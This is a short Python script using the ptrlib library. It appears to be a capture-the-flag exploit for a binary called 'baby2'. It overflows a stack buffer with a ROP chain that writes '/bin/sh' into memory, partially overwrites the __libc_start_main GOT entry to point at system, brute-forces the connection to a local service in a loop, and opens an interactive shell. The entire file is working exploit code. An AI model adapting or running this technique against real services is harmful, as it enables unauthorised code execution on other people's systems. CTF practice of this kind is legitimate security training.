from ptrlib import *
import time

elf = ELF("./baby2")
#libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
#sock = Socket("")
libc = ELF("/lib64/libc.so.6")

while True:
    sock = Socket("127.0.0.1", 4001)
    #_ = input()

    rop_pop_rsi_pop_r15 = 0x00400651
    rop_pop_rdi = 0x00400653
    rop_libc_csu_init = 0x0040064a
    call_libc_csu_init = 0x00400630

    plt_read = 0x400470
    plt_libc_start_main = 0x400480
    addr_binsh = elf.symbol("__bss_start") + 8

    payload = b'A' * 0x38

    payload += p64(rop_pop_rdi)
    payload += p64(0)
    payload += p64(rop_pop_rsi_pop_r15)
    payload += p64(addr_binsh)
    payload += b'A' * 8
    payload += p64(plt_read)

    payload += p64(rop_pop_rdi)
    payload += p64(0)
    payload += p64(rop_pop_rsi_pop_r15)
    payload += p64(elf.got("__libc_start_main"))
    payload += b'A' * 8
    payload += p64(plt_read)

    payload += p64(rop_pop_rdi)
    payload += p64(addr_binsh)
    payload += p64(plt_libc_start_main)

    payload = payload + b'\x00' * (0x12c - len(payload))

    sock.send(payload)
    sock.send('/bin/sh' + '\x00' * (0x12c - len('/bin/sh')))
    sock.send(p64(libc.symbol("system") & 0xffffff)[:3])
    time.sleep(1)
    sock.sendline("ls -lh")
    #break
    a = sock.recv()
    if a is not None:
        break
    else:
        sock.close()

print(a)
sock.interactive()
